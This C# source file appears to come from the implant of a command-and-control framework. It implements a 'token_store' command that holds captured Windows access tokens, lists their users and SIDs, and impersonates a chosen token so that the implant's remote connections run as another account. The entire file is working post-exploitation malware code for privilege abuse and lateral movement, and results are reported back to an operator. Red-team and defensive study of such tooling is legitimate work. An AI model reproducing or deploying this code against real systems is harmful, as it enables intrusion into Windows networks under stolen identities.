using DynamicEngLoading;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management.Automation.Remoting;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using static DynamicEngLoading.h_DynInv;

namespace Engineer.Commands
{
    internal class token_store : EngineerCommand
    {
        public override string Name => "token_store";

        public static List<Win32.Advapi32.TokenEntry> tokenEntries = new List<Win32.Advapi32.TokenEntry>();

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                //parse arguments, arguments should contain either a /view or /add argument
                if (task.Arguments.TryGetValue("/view", out string view))
                {
                    if (tokenEntries.Count > 0)
                    {
                        //get the current token
                        var ReadToken = h_DynInv_Methods.AdvApi32FuncWrapper.OpenProcessToken(new IntPtr(-1), h_DynInv.Win32.Advapi32.TOKEN_READ, out var hToken);

                        List<TokenStoreItem> tokenStoreItems = new List<TokenStoreItem>();
                        foreach (var token in tokenEntries)
                        {
                            //check if the token is the current token
                            bool isCurrent = false;
                            if (hToken == token.hToken)
                            {
                                isCurrent = true;
                            }
                            if (token.username != token.winId.Name)
                            {
                                TokenStoreItem tokenStoreItem = new TokenStoreItem();
                                tokenStoreItem.Index = tokenEntries.IndexOf(token);
                                tokenStoreItem.Username = token.username;
                                tokenStoreItem.SID = "Network Only Impersonation No SID";
                                tokenStoreItem.PID = token.pid;
                                tokenStoreItem.IsCurrent = isCurrent;
                                tokenStoreItems.Add(tokenStoreItem);
                            }
                            else
                            {
                                //we want to make TokenStoreItem's for each token in the store
                                TokenStoreItem tokenStoreItem = new TokenStoreItem();
                                tokenStoreItem.Index = tokenEntries.IndexOf(token);
                                tokenStoreItem.Username = token.winId.Name;
                                tokenStoreItem.SID = token.winId.User.Value;
                                tokenStoreItem.PID = token.pid;
                                tokenStoreItem.IsCurrent = isCurrent;
                                tokenStoreItems.Add(tokenStoreItem);
                            }
                        }
                        //send back token store items
                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(tokenStoreItems, task, EngTaskStatus.Complete, TaskResponseType.TokenStoreItem);
                    }
                    else
                    {
                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("[-] no tokens currently in store", task, EngTaskStatus.Complete, TaskResponseType.String);
                    }
                }

                if (task.Arguments.TryGetValue("/remove", out string tokenIndexToRemove))
                {
                    bool tokenIdParsed = int.TryParse(tokenIndexToRemove, out int tokenIndex);
                    if (tokenIdParsed)
                    {
                        //find and remove the token entry with that index 
                        var tokenEntry = tokenEntries[tokenIndex];
                        tokenEntries.Remove(tokenEntry);
                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"removed token {tokenIndex} from store", task, EngTaskStatus.Complete, TaskResponseType.String);
                    }
                    else
                    {
                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"[-] failed to parse token index {tokenIndexToRemove}", task, EngTaskStatus.Failed, TaskResponseType.String);
                    }

                }

                if (task.Arguments.TryGetValue("/use", out string tokenIdtoUse))
                {
                    int.TryParse(tokenIdtoUse, out int tokenIndex);

                    //check if the token index is in the token store
                    if (tokenIndex > 0 && tokenIndex <= tokenEntries.Count)
                    {
                        var tokenentry = tokenEntries[tokenIndex];
                        //impersonate the token
                        var isImpersonated = h_DynInv_Methods.AdvApi32FuncWrapper.ImpersonateLoggedOnUser(tokenentry.hToken);
                        if (isImpersonated)
                        {
                            tokenentry.winId.Impersonate();
                            Program.ImpersonatedUser = tokenentry.winId;
                            Program.ImpersonatedUserChanged = true;
                            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"impersonated token {tokenIndex}, now using {tokenentry.winId.Name} for remote connections", task, EngTaskStatus.Complete, TaskResponseType.String);
                        }
                        else
                        {
                            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"[-] failed to impersonate token {tokenIndex}", task, EngTaskStatus.Failed, TaskResponseType.String);
                        }

                    }
                }
            }
            catch (Exception ex)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"[-] error in token_store: {ex.Message}", task, EngTaskStatus.Failed, TaskResponseType.String);
            }
        }

        public static bool AddTokenToStore(IntPtr hToken, int pid)
        {
            try
            {
                //create a new token entry
                Win32.Advapi32.TokenEntry tokenEntry = new Win32.Advapi32.TokenEntry();
                WindowsIdentity winId = new WindowsIdentity(hToken);
                tokenEntry.winId = winId;
                tokenEntry.hToken = hToken;
                tokenEntry.pid = pid;
                tokenEntry.username = winId.Name;
                tokenEntries.Add(tokenEntry);
                return true;

            }
            catch (Exception)
            {
                return false;
            }
        }

        public static bool AddTokenToStore(IntPtr hToken, int pid, string username)
        {
            try
            {
                //create a new token entry
                Win32.Advapi32.TokenEntry tokenEntry = new Win32.Advapi32.TokenEntry();
                WindowsIdentity winId = new WindowsIdentity(hToken);
                tokenEntry.winId = winId;
                tokenEntry.hToken = hToken;
                tokenEntry.pid = pid;
                tokenEntry.username = username;
                tokenEntries.Add(tokenEntry);
                return true;

            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
